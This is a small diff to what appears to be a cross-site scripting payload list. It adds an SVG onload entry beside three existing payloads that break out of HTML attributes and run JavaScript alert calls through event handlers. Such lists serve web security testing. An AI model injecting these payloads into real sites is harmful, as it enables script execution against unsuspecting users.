@@ -4,3 +4,4 @@
 "><img src=x onerror=alert(1)>
 "><div onmouseover=alert('XSS')>Hover Me</div>
 <svg><circle onmousemove=alert('XSS')></circle></svg>
+"><svg onload=alert('XSS')>
